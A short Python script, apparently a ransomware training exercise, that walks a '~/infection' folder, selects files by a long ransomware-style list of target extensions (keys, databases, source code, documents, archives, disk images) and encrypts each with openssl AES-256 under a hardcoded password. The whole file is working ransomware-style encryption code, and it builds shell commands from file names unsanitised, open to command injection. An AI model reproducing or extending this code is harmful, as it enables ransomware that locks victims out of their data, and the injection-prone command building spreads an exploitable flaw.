import os
from os import scandir, getcwd
from os.path import abspath

extensions = ('.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw', '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif', '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm', '.mml', '.lay', '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql', '.accdb', '.mdb', '.db', '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf', '.ldf', '.sln', '.suo', '.cs', '.c', '.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat', '.ps1', '.vbs', '.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php', '.asp', '.rb', '.java', '.jar', '.class', '.sh', '.mp3', '.wav', '.swf', '.fla', '.wmv', '.mpg', '.vob', '.mpeg', '.asf', '.avi', '.mov', '.mp4', '.3gp', '.mkv', '.3g2', '.flv', '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg', '.ai', '.psd', '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif', '.png', '.bmp', '.jpg', '.jpeg', '.vcd', '.iso', '.backup', '.zip', '.rar', '.7z', '.gz', '.tgz', '.tar', '.bak', '.tbk', '.bz2', '.PAQ', '.ARC', '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.sldm', '.sldx', '.sti', '.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1', '.wks', '.123', '.rtf', '.csv', '.txt', '.vsdx', '.vsd', '.edb', '.eml', '.msg', '.ost', '.pst', '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', '.pps', '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx', '.xlc', '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx', '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc')


dir = os.environ['HOME']
dir += '/infection'

def encrypt(file_s):
    for obj in file_s:
        command = str("openssl aes-256-cbc -in " + obj + " -pass pass:1234 -out " + obj + ".cript")
        os.system(command)
        print (command)

dir_s = []
files = []
def ls(ruta = getcwd()):
    aux = [abspath(arch.path) for arch in scandir(ruta) if arch.is_file()]
    for a in aux:
        a = str(a)
        if os.path.splitext(a)[1] in extensions:
            files.append(a)

if not os.path.exists(dir):
    print("[🚨] Folder /infection not found!!!")
    quit(1)

for elem in os.walk(dir):
    dir_s.append(elem[0])
for sub_d in dir_s:
    ls(sub_d)

encrypt(files)

